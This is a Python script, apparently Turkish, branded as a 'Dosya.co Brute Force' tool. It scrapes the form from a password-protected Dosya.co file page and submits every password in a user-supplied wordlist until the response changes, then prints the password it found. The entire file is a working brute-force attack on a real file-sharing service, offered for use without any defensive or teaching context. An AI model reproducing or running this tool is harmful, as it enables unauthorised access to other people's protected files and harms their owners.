import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Colorama'yı başlat
init(autoreset=True)

# Başlık
print(f"""{Fore.RED + Style.BRIGHT}
          _____
         |A .  | _____
         | /.\ ||A ^  | _____
         |(_._)|| / \ ||A _  | _____
         |  |  || \ / || ( ) ||A_ _ |
         |____V||  .  ||(_'_)||( v )|
                |____V||  |  || \ / |
                       |____V||  .  |
                              |____V|
                {Fore.YELLOW}HeJo-03
          {Fore.CYAN}Dosya.co Brute Force

{Style.RESET_ALL}
""")

# Kullanıcı girişleri
url = input(f"{Fore.YELLOW}Dosya.co linkini giriniz: {Style.RESET_ALL}")
worldlist = input(f"{Fore.YELLOW}Wordlist dosyasını giriniz (.txt): {Style.RESET_ALL}")

# Sayfanın HTML'sini al
response = requests.get(url)
if response.status_code != 200:
    print(f"{Fore.RED}Sayfaya erişilemedi! HTTP Kod: {response.status_code}")
    exit()

soup = BeautifulSoup(response.text, "html.parser")

# Form alanlarını ve verilerini bul
form = soup.find("form")
if not form:
    print(f"{Fore.RED}Form bulunamadı! Lütfen geçerli bir link girin.")
    exit()

action = form.get("action")  # Formun gönderim URL'si
form_url = action if action.startswith("http") else url + action  # Tam URL'yi oluştur

# Form input'larını hazırla
data = {}
for input_tag in form.find_all("input"):
    name = input_tag.get("name")
    if name:
        data[name] = input_tag.get("value", "")  # Varsayılan değeri ekle

# Wordlist dosyasını oku
try:
    with open(f"{worldlist}", "r") as file:
        passwords = file.readlines()
except FileNotFoundError:
    print(f"{Fore.RED}Wordlist dosyası bulunamadı! Lütfen geçerli bir dosya adı girin.")
    exit()

# Şifre denemelerini yap
for password in passwords:
    password = password.strip()  # Satır sonu karakterlerini temizle
    data["password"] = password  # Şifreyi form verisine ekle

    # POST isteği gönder
    post_response = requests.post(form_url, data=data)
    response_text = post_response.text.strip()

    # Yanıt kontrolü ve çıktıyı düzenleme
    if response_text.startswith("<!DOCTYPE HTML PUBLIC"):
        print(f"{Fore.YELLOW}Şifre: {Fore.CYAN}{password} {Fore.RED}| Sonuç: Şifre yanlış")
    else:
        print(f"{Fore.GREEN}Şifre: {Fore.CYAN}{password} {Fore.GREEN}| Yanıt: \n\n{response_text[:200]}\n")
        print(f"{Fore.MAGENTA}Doğru şifre bulundu: {password}")
        break  # Doğru şifre bulunduğunda döngüyü durdur
